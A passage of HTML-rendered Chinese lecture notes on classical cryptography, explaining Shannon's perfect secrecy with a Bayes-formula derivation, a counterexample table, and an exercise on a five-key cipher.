mathnormal">p</span></span></span></span></span></p><p>故所有密文字符取值概率相等。<br />当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi><mo mathvariant="normal">≠</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|\ne |C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>时，举出以下反例：</p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">a</th><th style="text-align:center">b</th><th style="text-align:center">c</th></tr></thead><tbody><tr><td style="text-align:center">k1</td><td style="text-align:center">1</td><td style="text-align:center">2</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center">k2</td><td style="text-align:center">4</td><td style="text-align:center">5</td><td style="text-align:center">6</td></tr></tbody></table></font><p><font color=red>理解的关键在于此时<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>→</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">C\rightarrow P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>不再是双射，对于一个密文可能不存在k能使其解密为任何一个明文，上面的算式就不成立了。</font></p><h2 id="二-完善保密性"><a class="markdownIt-Anchor" href="#二-完善保密性"></a> 二. 完善保密性</h2><p>一个密码具有完善保密性的必要条件：分析者无法通过观察密文得到明文。</p><p>单表代换密码不具有完善保密性，原因是明文和密文具有相同的概率分布特性。</p><p>定义：一个密码体制具有完全保密性，如果对于任意<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">x\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>∈</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">y \in C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，都有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[x|y]=Pr[x]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose">]</span></span></span></span>，即密文字符随机变量与明文字符随机变量独立（或说明文x的后验概率等于其先验概率）</p><p>后验概率通过贝叶斯公式计算：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo></mrow><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></mfrac><mo>=</mo><mfrac><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo></mrow><mrow><munder><mo>∑</mo><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>∈</mo><mi>X</mi></mrow></munder><mi>P</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mfrac><mo>=</mo><mfrac><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo></mrow><mrow><munder><mo>∑</mo><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>∈</mo><mi>X</mi></mrow></munder><mi>P</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mfrac><mo>=</mo><mfrac><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><munder><mo>∑</mo><mrow><mo stretchy="false">{</mo><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow></munder><mi>P</mi><mo stretchy="false">(</mo><mi>K</mi><mo>=</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><mrow><munder><mo>∑</mo><mrow><mi>k</mi><mo>:</mo><mi>y</mi><mo>∈</mo><mi>C</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></munder><mi>P</mi><mo stretchy="false">(</mo><mi>K</mi><mo>=</mo><mi>k</mi><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">P(x|y)=\frac{P(xy)}{P(y)}=\frac{P(xy)}{\sum_{x_i\in X} P(x_i)P(y|x_i)}=\frac{P(x)P(y|x)}{\sum_{x_i\in X} P(x_i)P(y|x_i)}=\frac{P(x)\sum_{\{k:x=d_k(y)\}}P(K=k)}{\sum_{k:y\in C(k)} P(K=k)P(X=d_k(y))}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.51281em;vertical-align:-1.08581em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.39981em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.08581em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.51281em;vertical-align:-1.08581em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.39981em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.08581em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.7754200000000004em;vertical-align:-1.1607100000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.61471em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">:</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.86471em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">{</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">:</span><span class="mord mathnormal mtight">x</span><span class="mrel mtight">=</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span><span class="mclose mtight">}</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1607100000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>解释一下上式：<br />通过贝叶斯公式易得第三个等号后的式子，对于最后一个式子的变形：首先看分子，它表示明文字符为x且密文字符为y的概率。满足这种条件的密钥可能不止一个，因此可以将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(y|x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span>改写为满足这种条件的密钥的总概率，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∑</mo><mrow><mo stretchy="false">{</mo><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow></msub><mi>P</mi><mo stretchy="false">(</mo><mi>K</mi><mo>=</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum_{\{k:x=d_k(y)\}}P(K=k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.22471em;vertical-align:-0.47471em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">{</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">:</span><span class="mord mathnormal mtight">x</span><span class="mrel mtight">=</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span><span class="mclose mtight">}</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>。对于分母，它表示密文字符y的出现概率，对于每一个密钥，其都对应一个明文字符，使得该明文字符加密后成为该密钥字符y。因此可以将分母改写为密钥概率乘以对应明文出现概率。</p><p>定义的含义：</p><ol><li>明文x和对应密文y具有统计独立关系</li><li>明密文之间的互信息<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">I(x,y)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>（类似于相关系数）</li><li>攻击者分析y的统计规律无法推导出x</li></ol><p><strong>例：对于下面的加密系统，判断是否完善保密。</strong></p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">a</th><th style="text-align:center">b</th><th style="text-align:center">c</th><th style="text-align:center">d</th></tr></thead><tbody><tr><td style="text-align:center">k1</td><td style="text-align:center">1</td><td style="text-align:center">2</td><td style="text-align:center">3</td><td style="text-align:center">4</td></tr><tr><td style="text-align:center">k2</td><td style="text-align:center">2</td><td style="text-align:center">3</td><td style="text-align:center">4</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center">k3</td><td style="text-align:center">3</td><td style="text-align:center">4</td><td style="text-align:center">5</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">k4</td><td style="text-align:center">4</td><td style="text-align:center">5</td><td style="text-align:center">1</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">k5</td><td style="text-align:center">5</td><td style="text-align:center">1</td><td style="text-align:center">2</td><td style="text-align:center">3</td></tr></tbody></table><p>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>a</mi><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo separator="true">,</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>b</mi><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mn>4</mn></mfrac><mo separator="true">,</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>c</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>d</mi><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mn>8</mn></mfrac></mrow><annotation encoding="application/x-tex">Pr[a]=\frac{1}{2},Pr[b]=\frac{1}{4},Pr[c]=Pr[d]=\frac{1}{8}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" 